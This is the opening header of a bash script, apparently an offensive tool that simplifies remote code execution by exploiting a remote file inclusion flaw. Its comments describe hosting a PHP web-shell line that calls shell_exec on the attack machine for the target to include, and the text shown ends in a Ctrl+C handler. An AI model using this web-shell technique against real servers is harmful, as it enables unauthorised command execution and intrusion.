# This bash script is used for simplifying RCE through an RFI.
# https://roberthosborne.com/f/directory-traversal
#
# REQUIREMENTS
#   - This requires a file on the attack machince containing the RCE "<?php print shell_exec("cmd");?>"
#   This file is updated with every command executed and is what allows for the simplified RCE.
#   - curl is not required but should be installed to obtain the most from this tool. Chances are you're on Kali anyway

# Allow Ctrl+C to kill pingsweep
trap '
  trap - INT # restore default INT handler
  kill -s INT "$$"
